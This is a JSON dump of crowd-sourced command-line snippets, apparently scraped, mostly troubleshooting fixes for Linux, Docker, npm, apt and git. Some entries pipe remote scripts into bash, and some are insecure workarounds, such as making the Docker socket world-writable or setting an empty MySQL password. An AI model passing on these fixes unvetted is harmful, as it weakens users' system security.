Console.WriteLine(\"On the fifth day of Christmas my true love sent to me: 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 6)         {         Console.WriteLine(\"On the sixth day of Christmasmy true love sent to me: 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 7)         {         Console.WriteLine(\"On the seventh day of Christmas my true love sent to me: 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 8)         {         Console.WriteLine(\"On the eighth day of Christmas my true love sent to me: 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 9)         {         Console.WriteLine(\"On the ninth day of Christmas my true love sent to me: 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Bird 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 10)         {         Console.WriteLine(\"On the tenth day of Christmas my true love sent to me: 10 Lords a Leaping 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 11)         {         Console.WriteLine(\"On the eleventh day of Christmas my true love sent to me: 11 Pipers Piping 10 Lords a Leaping 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 12)         {         Console.WriteLine(\"On the twelfth day of Christmas my true love sent to me 12 Drummers Drumming 11 Pipers Piping 10 Lords a Leaping 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }                                  Console.WriteLine(\"Happy Holidays\");\nif December 25  \tPrint('Christmas')\nHappy Holidays Everyone! \nprint('Happy Holidays God Bless!!')\nMerry Christmas everyone. 2020 was weird but lets all hope that 2021 is better.\nHAPPY HOLIDAYS\nHappy Festivus!\nHappy Holidays!!!\n",
    "reg_date": "2021-10-11T21:59:58.000Z"
  },
  {
    "id": 91,
    "keyword": null,
    "link": null,
    "title": " Default gateway -linux",
    "description": "sk@sk:~$ ip route show default via 192.168.1.1 dev eth1  proto static  192.168.1.0/24 dev eth1  proto kernel  scope link  src 192.168.1.100  metric 1\nip route add default gw {IP-ADDRESS} {INTERFACE-NAME}\n",
    "reg_date": "2021-10-11T21:59:58.000Z"
  },
  {
    "id": 92,
    "keyword": null,
    "link": null,
    "title": " Deploy all file and subfolder git cpanel",
    "description": "--- deployment:   tasks:     - export DEPLOYPATH=/home/<user_name>/public_html #Add /<sub_folder> if required     - /bin/cp -r * $DEPLOYPATH\n",
    "reg_date": "2021-10-11T21:59:58.000Z"
  },
  {
    "id": 93,
    "keyword": null,
    "link": null,
    "title": " Deploying a React App* to GitHub Pages",
    "description": "npm install gh-pages --save-dev package.json //... \"homepage\": \"http://gitname.github.io/react-gh-pages\" //... \"scripts\": {   //...   \"predeploy\": \"npm run build\",   \"deploy\": \"gh-pages -d build\" } git init git remote add origin https://github.com/gitname/react-gh-pages.git npm run deploy git add . git commit -m \"Create a React app and publish it to GitHub Pages\" git push origin master\nnpm run deploy\necho \"# instagram-clone\" >> README.md git init git add README.md git commit -m \"first commit\" git branch -M main git remote add origin https://github.com/CoderJakaria/instagram-clone.git git push -u origin main\n",
    "reg_date": "2021-10-11T21:59:59.000Z"
  },
  {
    "id": 94,
    "keyword": null,
    "link": null,
    "title": " Disable Auto suspend in linux",
    "description": "$ sudo systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target \n",
    "reg_date": "2021-10-11T21:59:59.000Z"
  },
  {
    "id": 95,
    "keyword": null,
    "link": null,
    "title": " Docker permission denied",
    "description": "sudo chmod 666 /var/run/docker.sock  \nsudo usermod -aG docker ${USER} \nsudo chmod 666 /var/run/docker.sock \nsudo usermod -a -G docker $USER \nsudo setfacl --modify user:<user name or ID>:rw /var/run/docker.sock \nnewgrp docker\n",
    "reg_date": "2021-10-11T21:59:59.000Z"
  },
  {
    "id": 96,
    "keyword": null,
    "link": null,
    "title": " E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)",
    "description": "Method 1 ps aux | grep -i apt sudo kill -9 <process_id>  Method 2  sudo lsof /var/lib/dpkg/lock sudo lsof /var/lib/apt/lists/lock sudo lsof /var/cache/apt/archives/lock  sudo kill -9 <process_id>  sudo rm /var/lib/apt/lists/lock sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock  sudo dpkg --configure -a  sudo apt update  \nsudo killall apt-get\nsudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock\nsudo rm /var/lib/apt/lists/lock sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock* \n#You can delete the lock file with the following command. sudo rm /var/lib/apt/lists/lock #You may also need to delete the lock file in the cache directory sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock\nsudo rm /var/lib/apt/lists/locksudo rm /var/lib/apt/lists/lock-frontend\n",
    "reg_date": "2021-10-11T21:59:59.000Z"
  },
  {
    "id": 97,
    "keyword": null,
    "link": null,
    "title": " E: Sub-process /usr/bin/dpkg returned an error code (1)",
    "description": "sudo dpkg &ndash;i &ndash;&ndash;force&ndash;overwrite /var/cache/apt/archives/full_name_of_package\nsudo apt-get remove --purge package_name \nsudo dpkg -i --force-all /var/cache/apt/archives/full_name_of_package\n",
    "reg_date": "2021-10-11T21:59:59.000Z"
  },
  {
    "id": 98,
    "keyword": null,
    "link": null,
    "title": " E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?",
    "description": "sudo apt-get clean  \n",
    "reg_date": "2021-10-11T22:00:00.000Z"
  },
  {
    "id": 99,
    "keyword": null,
    "link": null,
    "title": " E: Unable to locate package ibus-avro",
    "description": "sudo apt install git libibus-1.0-dev automake autoconf make gjs ibus  git clone git://github.com/sarim/ibus-avro.git cd ibus-avro aclocal && autoconf && automake --add-missing ./configure --prefix=/usr sudo make install   #Select an input method -> Bengali -> Avro\n",
    "reg_date": "2021-10-11T22:00:00.000Z"
  },
  {
    "id": 100,
    "keyword": null,
    "link": null,
    "title": " E: Unable to locate package software-properties-common 2020",
    "description": "# that can be due to offline installation of the distro  # open the sources.list file using the following command sudo nano /etc/apt/sources.list  # check if the file contains the following lines deb http://http.kali.org/kali kali-rolling main non-free contrib  deb-src http://http.kali.org/kali kali-rolling main non-free contrib  # if it doesn't have these 2 lines, just add 'em at the beginning of the file and  # press ctrl+o save changes then ctrl+x to exit  # don't forget to type the following command in the terminal after you finish sudo apt update\n",
    "reg_date": "2021-10-11T22:00:00.000Z"
  },
  {
    "id": 101,
    "keyword": null,
    "link": null,
    "title": " E: Unmet dependencies. Try 'apt --fix-broken install' with no packages (or specify a solution).",
    "description": "sudo apt-get -o Dpkg::Options::=\"--force-overwrite\" install --fix-broken \n",
    "reg_date": "2021-10-11T22:00:00.000Z"
  },
  {
    "id": 102,
    "keyword": null,
    "link": null,
    "title": " E: dpkg was interrupted, you must manually run 'sudo dpkg --configure -a' to correct the problem",
    "description": "run $ sudo dpkg --configure -a\n",
    "reg_date": "2021-10-11T22:00:00.000Z"
  },
  {
    "id": 103,
    "keyword": null,
    "link": null,
    "title": " EACCES: permission denied, unlink '/home/ericgit/.cache/yarn/v6/np",
    "description": "sudo chown -R $USER:$GROUP ~/.npm sudo chown -R $USER:$GROUP ~/.config\n",
    "reg_date": "2021-10-11T22:00:00.000Z"
  },
  {
    "id": 104,
    "keyword": null,
    "link": null,
    "title": " ERROR: Could not find a version that satisfies the requirement cv2 (from versions: none)",
    "description": "#Know the reason is really dumb, because the reason is that the package of CV2 is not called cv2 but called opencv-python  pip install opencv-python  #For python3: pip3 install opencv-python\n# ERROR: Could not find a version that satisfies the requirement cv2 (from versions: none) $ pip install opencv_contrib_python\n",
    "reg_date": "2021-10-11T22:00:01.000Z"
  },
  {
    "id": 105,
    "keyword": null,
    "link": null,
    "title": " ERROR: Couldn't connect to Docker daemon at http+docker://localhost - is it running?",
    "description": "$ docker-machine restart default $ eval $(docker-machine env default) // Apparently you need to run the eval $(docker-machine env default) every time you run the quick start terminal.\nsudo usermod -aG docker $USER sudo chown $USER /var/run/docker.sock\nopen the terminal and type sudo dockerd and leave it open open new terminal and type sudo docker-compose up -d or sudo docker-compose build \n",
    "reg_date": "2021-10-11T22:00:01.000Z"
  },
  {
    "id": 106,
    "keyword": null,
    "link": null,
    "title": " ERROR:  Error installing jekyll:ERROR: Failed to build gem native",
    "description": "sudo apt-get install ruby-dev\n",
    "reg_date": "2021-10-11T22:00:01.000Z"
  },
  {
    "id": 107,
    "keyword": null,
    "link": null,
    "title": " ERROR:uvicorn.error:[Errno 98] Address already in use",
    "description": "sudo lsof -t -i tcp:8000 | xargs kill -9\n",
    "reg_date": "2021-10-11T22:00:01.000Z"
  },
  {
    "id": 108,
    "keyword": null,
    "link": null,
    "title": " ERROR 1698 (28000): Access denied for user 'root'@'localhost'",
    "description": ">>> sudo mysql -u root -p  >>> USE mysql;  >>> UPDATE user SET plugin='mysql_native_password' WHERE User ='root';  >>> FLUSH PRIVILEGES;  >>> exit;  >>> service mysql restart; \n$ sudo mysql -u root # I had to use \"sudo\" since is new installation  mysql> USE mysql; mysql> UPDATE user SET plugin='mysql_native_password' WHERE User='root'; mysql> FLUSH PRIVILEGES; mysql> exit;  $ service mysql restart\nSET PASSWORD FOR 'bob'@localhost = PASSWORD(\"\"); \n",
    "reg_date": "2021-10-11T22:00:02.000Z"
  },
  {
    "id": 109,
    "keyword": null,
    "link": null,
    "title": " Edge shortcut",
    "description": "             === Keyboard shortcuts in Microsoft Edge === Ctrl + Shift + B      #Show or hide the favorites bar Ctrl + D              #Save the current tab as a favorite Ctrl + Shift + D\t  #Save all open tabs as favorites in a new folder Alt + D / Ctrl + L\t  #Select the URL in the address bar to edit Ctrl + E\t\t\t  #Open a search query in the address bar Alt + E\t\t\t\t  #Open the Settings and more \"...\" menu Ctrl + F\t\t      #Find on page Ctrl + H\t\t\t  #Open History in a new tab  Ctrl + J\t\t\t  #Open Downloads in a new tab Ctrl + Shift + I\t  #Open Developer Tools Ctrl + Shift + K\t  #Duplicate the current tab Ctrl + S\t\t\t  #Save the current page Ctrl + P\t\t\t  #Print the current page Ctrl + R\t\t\t  #Reload the current page Ctrl + T\t\t\t  #Open a new tab and switch to it Ctrl + U\t\t\t  #View source Ctrl + W\t\t\t  #Close the current tab Ctrl + Plus/ Minus \t  #Zoom in/out F5\t\t\t\t\t  #Reload the current tab F11\t\t\t\t\t  #Enter full screen (toggle) F12\t\t\t\t\t  #Open Developer Tools PgUp\t\t\t\t  #Scroll up webpage, one screen at a time PgDn\t\t\t\t  #Scroll down webpage, one screen at a time Home\t\t\t\t  #Go to the top of the page Ctrl + right click    #Open a link in new tab Press Scroll Wheel    #Open a link in new tab\n",
    "reg_date": "2021-10-11T22:00:02.000Z"
  },
  {
    "id": 110,
    "keyword": null,
    "link": null,
    "title": " Err:1 http://security.ubuntu.com/ubuntu focal-secur Temporary failure resolving 'security.ubuntu.com'",
    "description": "echo \"nameserver 8.8.8.8\" | sudo tee /etc/resolv.conf > /dev/null \n",
    "reg_date": "2021-10-11T22:00:02.000Z"
  },
  {
    "id": 111,
    "keyword": null,
    "link": null,
    "title": " Error: 0x80370102 The virtual machine could not be started because a required feature is not installed.",
    "description": "Simple solution ,use wsl version 1   Open powershell with admin and run :  wsl --set-default-version 1 \nassuming you installed wsl2 correctly and still getting this error,  possible solution: enable virtualization in BIOS\n",
    "reg_date": "2021-10-11T22:00:02.000Z"
  },
  {
    "id": 112,
    "keyword": null,
    "link": null,
    "title": " Error: Can't resolve @capacitor/dialog",
    "description": "npm i @capacitor/dialog --save-dev\n",
    "reg_date": "2021-10-11T22:00:02.000Z"
  },
  {
    "id": 113,
    "keyword": null,
    "link": null,
    "title": " Error: Cannot find module 'resolve'",
    "description": "$ rm -rf node_modules package-lock.json $ npm i\n",
    "reg_date": "2021-10-11T22:00:04.000Z"
  },
  {
    "id": 114,
    "keyword": null,
    "link": null,
    "title": " Error: Cannot find module 'webpack-dev-server'",
    "description": "npm install --save-dev webpack-dev-middleware webpack-hot-middleware\n",
    "reg_date": "2021-10-11T22:00:05.000Z"
  },
  {
    "id": 115,
    "keyword": null,
    "link": null,
    "title": " Error: Cannot install in Homebrew on ARM processor in Intel default prefix (/usr/local)!",
    "description": "For what it's worth, before installing Homebrew you will need to install Rosetta2 emulator for the new ARM silicon (M1 chip). I just installed Rosetta2 via terminal using:  /usr/sbin/softwareupdate --install-rosetta --agree-to-license  This will install rosetta2 with no extra button clicks.  After installing Rosetta2 above you can then use the Homebrew cmd and install Homebrew for ARM M1 chip:  arch -x86_64 /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)\"  Once Homebrew for M1 ARM is installed use this Homebrew command to install packages: arch -x86_64 brew install <package>\n",
    "reg_date": "2021-10-11T22:00:05.000Z"
  },
  {
    "id": 116,
    "keyword": null,
    "link": null,
    "title": " Error: ENOSPC: System limit for number of file watchers reached",
    "description": "echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf && sudo sysctl -p # that modifies the file watch limit to max 524,288 which consume approx. 512MB Ram for 64bit. # reduce that number to consume less memory.  # to see if that did it run cat /proc/sys/fs/inotify/max_user_watches  # you should see fs.inotify.max_user_watches=524288 \nUbuntu  sudo gedit /etc/sysctl.conf  Add a line at the bottom  fs.inotify.max_user_watches=524288  Then save and exit!  sudo sysctl -p\n# insert the new value into the system config echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf && sudo sysctl -p  # check that the new value was applied cat /proc/sys/fs/inotify/max_user_watches  # config variable name (not runnable) fs.inotify.max_user_watches=524288 \necho fs.inotify.max_user_watches=582222 | sudo tee -a /etc/sysctl.conf && sudo sysctl -p\nSystem limit for number of file watchers reached\necho fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf && sudo sysctl -p \n",
    "reg_date": "2021-10-11T22:00:05.000Z"
  },
  {
    "id": 117,
    "keyword": null,
    "link": null,
    "title": " Error: No available formula with the name \"mongodb\"",
    "description": "/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n",
    "reg_date": "2021-10-11T22:00:06.000Z"
  },
  {
    "id": 118,
    "keyword": null,
    "link": null,
    "title": " Error: Node Sass does not yet support your current environment: Linux 64-bit with Unsupported runtime (83)",
    "description": " npm update node-sass\nnpm rebuild node-sass\nnpm install --save-dev node-sass \n",
    "reg_date": "2021-10-11T22:00:06.000Z"
  },
  {
    "id": 119,
    "keyword": null,
    "link": null,
    "title": " Error: Node Sass does not yet support your current environment: Windows 64-bit with Unsupported runtime",
    "description": " npm update node-sass\nnpm rebuild node-sass\n",
    "reg_date": "2021-10-11T22:00:06.000Z"
  },
  {
    "id": 120,
    "keyword": null,
    "link": null,
    "title": " Error: Node Sass does not yet support your current environment",
    "description": "npm rebuild node-sass\n",
    "reg_date": "2021-10-11T22:00:06.000Z"
  },
  {
    "id": 121,
    "keyword": null,
    "link": null,
    "title": " Error: Node Sass version 5.0.0 is incompatible with ^4.0.0.",
    "description": "with npm => 1.npm uninstall node-sass 2.npm install node-sass@4.14.1 with yarn =>  1.yarn remove node-sass 2.yarn remove node-sass@4.14.1\nwith npm => 1.npm uninstall node-sass 2.npm install node-sass@4.14.1 with yarn =>  1.yarn remove node-sass 2.yarn add node-sass@4.14.1\nwith npm => 1. npm uninstall node-sass 2. npm install node-sass@4.14.1 with yarn =>  1. yarn remove node-sass 2. yarn add node-sass@4.14.1  // ^ Update to MR J's post\n    npm uninstall node-sass     npm install node-sass@4.14.1  Or, if using yarn (default in newer CRA versions)      yarn remove node-sass     yarn add node-sass@4.14.1\n$ npm uninstall node-sass $ npm install node-sass@4.14.1  # Or, if using yarn (default in newer CRA versions)  $ yarn remove node-sass $ yarn add node-sass@4.14.1\nSolution 1 Uninstall node-sass npm uninstall node-sass  2  use sass by: npm install -g sass npm install --save-dev sass \n",
    "reg_date": "2021-10-11T22:00:06.000Z"
  },
  {
    "id": 122,
    "keyword": null,
    "link": null,
    "title": " Error: Problem validating fields in app.json. See https://docs.expo.io/workflow/configuration/  • should NOT have additional property 'nodeModulesPath'.",
    "description": "npm install -g expo-cli \n",
    "reg_date": "2021-10-11T22:00:07.000Z"
  },
  {
    "id": 123,
    "keyword": null,
    "link": null,
    "title": " Error: That port is already in use.",
    "description": "sudo lsof -t -i tcp:8000 | xargs kill -9\nnetstat -ano | findstr 8080\n# list the running ports $ netstat -ltnp # kill specific port in my case for django 8000. kill using PID $ kill -9 31434\ntaskkill -f /pid 18932 \nKill port django\nkill -9 $(lsof -i TCP:8000 | grep LISTEN | awk '{print $2}')\n",
    "reg_date": "2021-10-11T22:00:07.000Z"
  },
  {
    "id": 124,
    "keyword": null,
    "link": null,
    "title": " Error: Unable to resolve module `react-native-screens` from `node modules/@react-navigation/bottom-tabs/src/views/BottomTabView.tsx`: react-native-screens could not be found within the project.",
    "description": "# If you are using react-navigation in your bare react-native project do not forget to also install the following required dependencies: npm install react-native-reanimated react-native-gesture-handler react-native-screens react-native-safe-area-context @react-native-community/masked-view  # Yarn yarn add react-native-reanimated react-native-gesture-handler react-native-screens react-native-safe-area-context @react-native-community/masked-view\n",
    "reg_date": "2021-10-11T22:00:07.000Z"
  },
  {
    "id": 125,
    "keyword": null,
    "link": null,
    "title": " Error: couldn't connect to server 127.0.0.1:27017, connection attempt failed",
    "description": "sudo service mongodb start \nsystemctl enable  mongod systemctl start  mongod  #reboot your machine  mongo\nsudo rm /var/lib/mongodb/mongod.lock sudo mongod --dbpath /var/lib/mongodb/ --repair sudo mongod --dbpath /var/lib/mongodb/ --journal \nThis method only works if you want to repair your data files without preserving the original files  To find where you dbpath resides- vim /etc/mongodb.conf  check for option dbpath=  (I have dbpath=/var/lib/mongodb)  Default: /data/db/  Typical locations include: /srv/mongodb, /var/lib/mongodb or /opt/mongodb .  Replace the /var/lib/mongodb with your dbpath  sudo rm /var/lib/mongodb/mongod.lock sudo mongod --dbpath /var/lib/mongodb/ --repair sudo mongod --dbpath /var/lib/mongodb/ --journal (Make sure that you leave you terminal running in which you have run above lines, dont press 'Ctrl+c' or quit it.) Type the command to start mongo now in another window.  Hope this works for you ! for those who want to repair your data files while preserving the original files mongo recover\n//macos brew services start mongodb-community\n",
    "reg_date": "2021-10-11T22:00:07.000Z"
  },
  {
    "id": 126,
    "keyword": null,
    "link": null,
    "title": " Error initializing network controller: Error creating default \"bridge\" network: Failed to program NAT chain: ZONE CONFLICT: 'docker0' already bound to a zone",
    "description": "sudo firewall-cmd --zone=trusted --remove-interface=docker0 sudo firewall-cmd --zone=trusted --remove-interface=docker0 --permanent\n",
    "reg_date": "2021-10-11T22:00:07.000Z"
  },
  {
    "id": 127,
    "keyword": null,
    "link": null,
    "title": " Error response from daemon: open \\\\.\\pipe\\docker engine linux: The system cannot find the file specified.",
    "description": "cd \"C:\\Program Files\\Docker\\Docker\" ./DockerCli.exe -SwitchDaemon\ncd \"C:\\Program Files\\Docker\\Docker\" \"./DockerCli.exe\" -SwitchDaemon\n",
    "reg_date": "2021-10-11T22:00:08.000Z"
  },
  {
    "id": 128,
    "keyword": null,
    "link": null,
    "title": " Error running '  rvm make -j1'",
    "description": "This worked for me: rvm install ruby-2.5.1 --with-openssl-dir=/usr/local/opt/openssl\n",
    "reg_date": "2021-10-11T22:00:08.000Z"
  },
  {
    "id": 129,
    "keyword": null,
    "link": null,
    "title": " Error starting daemon: error while opening volume store metadata database: timeout",
    "description": "# Run this bellow code it will fix the error ps axf | grep docker | grep -v grep | awk '{print \"kill -9 \" $1}' | sudo sh \n",
    "reg_date": "2021-10-11T22:00:08.000Z"
  },
  {
    "id": 130,
    "keyword": null,
    "link": null,
    "title": " Exception: Error running pod install",
    "description": "flutter clean rm -Rf ios/Pods rm -Rf ios/.symlinks rm -Rf ios/Flutter/Flutter.framework rm -Rf ios/Flutter/Flutter.podspec cd ios pod install cd .. flutter build ios flutter run\n[Solved] error running pod install in flutter on mac\n",
    "reg_date": "2021-10-11T22:00:08.000Z"
  },
  {
    "id": 131,
    "keyword": null,
    "link": null,
    "title": " Failed at the node-sass@4.10.0 postinstall script.",
    "description": "rm -rf package-lock.json node_modules npm cache clean --force npm i --unsafe-perm node-sass\n",
    "reg_date": "2021-10-11T22:00:08.000Z"
  },
  {
    "id": 132,
    "keyword": null,
    "link": null,
    "title": " Failed at the node-sass@4.7.2 postinstall script.",
    "description": "sudo npm install node-sass --save-dev --unsafe-perm=true\n",
    "reg_date": "2021-10-11T22:00:08.000Z"
  },
  {
    "id": 133,
    "keyword": null,
    "link": null,
    "title": " Failed to execute child process “python” (No such file or directory)",
    "description": "sudo ln -s /usr/bin/python3 /usr/bin/python \n",
    "reg_date": "2021-10-11T22:00:08.000Z"
  },
  {
    "id": 134,
    "keyword": null,
    "link": null,
    "title": " Failed to fetch https://packages.sury.org/php/dists/jessie/main/binary-amd64/Packages HttpError404",
    "description": "it because the \"jessie\" has been removed.  to change it, follow this step: sudo nano /etc/apt/sources.list.d/php.list  change this line \tdeb https://packages.sury.org/php/ jessie main to this \tdeb https://packages.sury.org/php/ stretch main  save\n",
    "reg_date": "2021-10-11T22:00:09.000Z"
  },
  {
    "id": 135,
    "keyword": null,
    "link": null,
    "title": " Failed to fetch platform cordova-android@^8.0.0",
    "description": "rm -rf node_modules package-lock.json npm i\n",
    "reg_date": "2021-10-11T22:00:09.000Z"
  },
  {
    "id": 136,
    "keyword": null,
    "link": null,
    "title": " Failed to install gems via Bundler.",
    "description": "Failed to install gems via Bundler.  I solved this issue this way:  bundle update git add Gemfile.lock git commit -m 'Update Gemfile.lock for Heroku' git push heroku master\n",
    "reg_date": "2021-10-11T22:00:09.000Z"
  },
  {
    "id": 137,
    "keyword": null,
    "link": null,
    "title": " Failed to install the app. Make sure you have the Android development environment set up",
    "description": "\"Failed to install the app\" \"Make sure you have the Android development environment set up\" run below code in terminal => react-native start --reset-cache\nuse the below code :   react-native start --reset-cache\ncd android chmod +x gradlew\n1 check if you have java-runtiume install   2 check the missing sdk name and then install the sdk in android studios  Config -> SDK manager -> android SDk (left menu) -> on right side in Tab menu SDK  tools   now check connnect devices  command==>>> adb devices         List of devices attached       emulator-5554 offline   # Google emulator       14ed2fcc device         # Physical device                       now =====> run react-native run-android \n",
    "reg_date": "2021-10-11T22:00:10.000Z"
  },
  {
    "id": 138,
    "keyword": null,
    "link": null,
    "title": " Failed to restart apache2.service: Unit not found.",
    "description": "You are using different service of apache.  run this if you are using the same service.  systemctl restart httpd <----------------- Or ------------------> apachectl restart\n",
    "reg_date": "2021-10-11T22:00:10.000Z"
  },
  {
    "id": 139,
    "keyword": null,
    "link": null,
    "title": " Failed to start A high performance web server and a reverse proxy server.",
    "description": " sudo systemctl stop apache2 then sudo systemctl start nginx\n",
    "reg_date": "2021-10-11T22:00:10.000Z"
  },
  {
    "id": 140,
    "keyword": null,
    "link": null,
    "title": " Failed to start Docker Application Container Engine",
    "description": "#Failed to start Docker Application Container Engine sudo dockerd --debug # this command will show error # if error is==> Error starting daemon: error while opening volume store metadata database: timeout ps axf | grep docker | grep -v grep | awk '{print \"kill -9 \" $1}' | sudo sh # Run above command it will fix the error sudo systemctl start docker # it will start the docker sudo systemctl status docker  # to check the satus of docker\n",
    "reg_date": "2021-10-11T22:00:10.000Z"
  },
  {
    "id": 141,
    "keyword": null,
    "link": null,
    "title": " Failed to start The Apache HTTP Server.",
    "description": "sudo systemctl status nginx  #if nginx is active then stop with sudo systemctl stop nginx  #start apache2 sudo systemctl start apache2.service\nsudo systemctl status nginx sudo systemctl stop nginx // if nginx is running\ndidier delaey solved after reinstallation with synaptic pakage manager\n",
    "reg_date": "2021-10-11T22:00:11.000Z"
  },
  {
    "id": 142,
    "keyword": null,
    "link": null,
    "title": " Failed to start cron.service: Unit not found. in centos7",
    "description": "systemctl enable crond && systemctl restart crond \n",
    "reg_date": "2021-10-11T22:00:11.000Z"
  },
  {
    "id": 143,
    "keyword": null,
    "link": null,
    "title": " Failed to start docker.service: Unit docker.service is masked",
    "description": "sudo systemctl unmask docker sudo systemctl start docker\n",
    "reg_date": "2021-10-11T22:00:11.000Z"
  },
  {
    "id": 144,
    "keyword": null,
    "link": null,
    "title": " Failed to start gunicorn daemon ubuntu",
    "description": "sudo systemctl enable gunicorn.service sudo systemctl start gunicorn.socket sudo systemctl status gunicorn.service\n",
    "reg_date": "2021-10-11T22:00:11.000Z"
  },
  {
    "id": 145,
    "keyword": null,
    "link": null,
    "title": " Failed to start nginx.service: Unit nginx.service not found.",
    "description": "# You need to run `systemctl daemon-reload` to reload systemd.\n",
    "reg_date": "2021-10-11T22:00:11.000Z"
  },
  {
    "id": 146,
    "keyword": null,
    "link": null,
    "title": " Failed to start redis-server.service: Unit redis-server.service is masked.",
    "description": "$ sudo systemctl unmask  redis-server.service \n",
    "reg_date": "2021-10-11T22:00:12.000Z"
  },
  {
    "id": 147,
    "keyword": null,
    "link": null,
    "title": " Faster Telegram installation on Kali Linux",
    "description": "Faster Telegram installation on Kali Linux https://youtu.be/VLmkotjJRmc\n",
    "reg_date": "2021-10-11T22:00:12.000Z"
  },
  {
    "id": 148,
    "keyword": null,
    "link": null,
    "title": " Fatal error in launcher:",
    "description": "python -m pip  #example [python -m pip install tensorflow]\nimport pip pip.main(['install','flask']) # replace flask with the name of module you want to install \n",
    "reg_date": "2021-10-11T22:00:12.000Z"
  },
  {
    "id": 149,
    "keyword": null,
    "link": null,
    "title": " Filename too long git",
    "description": "git config --system core.longpaths true \n// Should be global instead of system -> no 'permission denied' message git config --global core.longpaths true\n",
    "reg_date": "2021-10-11T22:00:12.000Z"
  },
  {
    "id": 150,
    "keyword": null,
    "link": null,
    "title": " Firebase tools",
    "description": "npm install -g firebase-tools\nnpm i firebase\ninstalling firebase tools\n",
    "reg_date": "2021-10-11T22:00:12.000Z"
  },
  {
    "id": 151,
    "keyword": null,
    "link": null,
    "title": " FirewallD is not running",
    "description": "systemctl start firewalld\n# check the status of the service (running and eanbled) systemctl status firewalld  # if the service is not running, start it systemctl start firewalld  # if the service has exited , restart it(check for error if any) systemctl restart firewalld  # if the service is not enabled, enable it systemctl enable firewalld\nsystemctl status firewalld\n",
    "reg_date": "2021-10-11T22:00:12.000Z"
  },
  {
    "id": 152,
    "keyword": null,
    "link": null,
    "title": " Firewall not enabled (skipping reload)",
    "description": "sudo ufw enable\n",
    "reg_date": "2021-10-11T22:00:13.000Z"
  },
  {
    "id": 153,
    "keyword": null,
    "link": null,
    "title": " Fix ‘add-apt-repository command not found’ Error on Ubuntu and Debian",
    "description": "// Ubuntu sudo apt-get install software-properties-common\n//Debian GNU/Linux and chromebook linux sudo apt install software-properties-common\n",
    "reg_date": "2021-10-11T22:00:13.000Z"
  },
  {
    "id": 154,
    "keyword": null,
    "link": null,
    "title": " Flutter plugin not installed; this adds Flutter specific functionality. windows",
    "description": "For windows   // run on commandline flutter config --android-studio-dir=C:\\Program Files\\Android\\Android Studio\nSolution that worked for me:   1. Just install plugins.   \t\tStudio>>File>Settings>Plugins>Browse Repositories   2. Search for flutter.   3. Tap on Install (a dialog will pop regarding dart dependency. click Yes).   4. Once the installation is finished restart android studio.  If still not worked   1. flutter channel dev   2. flutter doctor -v\nln -s ~/Library/Application\\ Support/Google/AndroidStudio4.1/plugins ~/Library/Application\\ Support/AndroidStudio4.1 \n",
    "reg_date": "2021-10-11T22:00:13.000Z"
  },
  {
    "id": 155,
    "keyword": null,
    "link": null,
    "title": " Gem::LoadError : \"ed25519 is not part of the bundle. Add it to your Gemfile.\"",
    "description": "echo \"add your private key path\" ssh-add ~/.ssh/id_rsa\n",
    "reg_date": "2021-10-11T22:00:13.000Z"
  },
  {
    "id": 156,
    "keyword": null,
    "link": null,
    "title": " Get the size of all the directories in current directory in linux",
    "description": "du -h --max-depth=1\n",
    "reg_date": "2021-10-11T22:00:14.000Z"
  },
  {
    "id": 157,
    "keyword": null,
    "link": null,
    "title": " Get total duration of video files in a directory",
    "description": "find . -maxdepth 1 -iname '*.mp4' -exec ffprobe -v quiet -of csv=p=0 -show_entries format=duration {} \\; 149.233333 130.146667 275.690000  find . -maxdepth 1 -iname '*.mp4' -exec ffprobe -v quiet -of csv=p=0 -show_entries format=duration {} \\; | paste -sd+ -| bc 555.070000 \n",
    "reg_date": "2021-10-11T22:00:14.000Z"
  },
  {
    "id": 158,
    "keyword": null,
    "link": null,
    "title": " Git - Can we recover deleted commits? [duplicate]",
    "description": "git reflog \ngit cherry-pick ID git push origin master \n",
    "reg_date": "2021-10-11T22:00:14.000Z"
  },
  {
    "id": 159,
    "keyword": null,
    "link": null,
    "title": " Git Code Push",
    "description": "git remote add origin https://github.com/shmahee/Marvel.git git branch -M main git push -u origin main\ngit remote add origin https://github.com/tqisjim/google-oauth.git git push -u origin master\n",
    "reg_date": "2021-10-11T22:00:14.000Z"
  },
  {
